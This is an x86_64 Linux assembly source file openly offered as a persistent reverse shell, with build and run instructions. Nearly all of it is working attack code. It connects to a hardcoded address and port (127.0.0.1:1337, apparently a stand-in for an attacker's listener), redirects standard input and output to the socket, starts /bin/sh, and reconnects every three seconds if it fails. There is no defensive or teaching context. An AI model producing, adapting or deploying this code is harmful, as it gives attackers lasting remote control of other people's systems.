; filename: reverse_shell.asm
; NASM x86_64 Linux assembly - Persistent reverse shell
; Usage: nasm -f elf64 reverse_shell.asm -o reverse_shell.o
;        ld reverse_shell.o -o reverse_shell
;        ./reverse_shell

section .data
    ip_addr     dd 0x0100007F       ; IP address 127.0.0.1 in network byte order (little-endian)
    port        dw 0x3905           ; Port 1337 (0x0539) in network byte order
    shell_path  db "/bin/sh",0
    argv        dq shell_path, 0

section .text
    global _start
    default rel 

_start:
    xor r12, r12           ; clear r12 (will store socket fd)
    
connect_loop:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41            ; sys_socket
    mov rdi, 2             ; AF_INET
    mov rsi, 1             ; SOCK_STREAM
    mov rdx, 0             ; protocol
    syscall
    
    cmp rax, 0
    jl sleep_and_retry     ; if socket failed, sleep and retry
    
    mov r12, rax           ; save socket fd

    ; prepare sockaddr_in struct on stack
    sub rsp, 16            ; allocate 16 bytes
    xor rax, rax           ; clear rax
    
    ; Build sockaddr_in struct
    mov word [rsp], 2      ; AF_INET = 2
    mov ax, [port]
    mov word [rsp+2], ax   ; port
    mov eax, [ip_addr]
    mov dword [rsp+4], eax ; IP address
    mov qword [rsp+8], 0   ; padding (8 zeros)

    ; connect(sockfd, sockaddr_in*, sizeof(sockaddr_in))
    mov rax, 42            ; sys_connect
    mov rdi, r12           ; socket fd
    mov rsi, rsp           ; pointer to sockaddr_in
    mov rdx, 16            ; size
    syscall

    add rsp, 16            ; free stack space

    test rax, rax          ; test if connect succeeded
    js close_and_retry     ; if negative (failed), jump

connected:
    ; fork()
    mov rax, 57            ; sys_fork
    syscall
    
    test rax, rax
    jnz parent             ; if not zero (parent), jump

child_process:
    ; dup2(sockfd, 0)
    mov rax, 33            ; sys_dup2
    mov rdi, r12           ; socket fd
    xor rsi, rsi           ; stdin = 0
    syscall

    ; dup2(sockfd, 1)
    mov rax, 33
    mov rdi, r12
    mov rsi, 1             ; stdout = 1
    syscall

    ; dup2(sockfd, 2)
    mov rax, 33
    mov rdi, r12
    mov rsi, 2             ; stderr = 2
    syscall

    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    mov rax, 59            ; sys_execve
    lea rdi, [shell_path]  ; filename
    lea rsi, [argv]        ; argv
    xor rdx, rdx           ; envp = NULL
    syscall

    ; if execve fails, exit child
    mov rax, 60            ; sys_exit
    xor rdi, rdi
    syscall

parent:
    ; close(sockfd) in parent
    mov rax, 3             ; sys_close
    mov rdi, r12
    syscall

    ; wait(NULL)
    mov rax, 61            ; sys_wait4
    xor rdi, rdi           ; pid = 0 (any child)
    xor rsi, rsi           ; status = NULL
    xor rdx, rdx           ; options = 0
    xor r10, r10           ; rusage = NULL
    syscall

close_and_retry:
    ; close socket if open
    cmp r12, 0
    jle sleep_and_retry    ; if socket fd <= 0, just sleep
    
    mov rax, 3             ; sys_close
    mov rdi, r12
    syscall
    xor r12, r12           ; reset socket fd

sleep_and_retry:
    ; sleep(3) using nanosleep
    mov rax, 35            ; sys_nanosleep
    sub rsp, 16
    mov qword [rsp], 3     ; tv_sec = 3
    mov qword [rsp+8], 0   ; tv_nsec = 0
    mov rdi, rsp           ; timespec
    xor rsi, rsi           ; rem = NULL
    syscall
    add rsp, 16
    
    jmp connect_loop
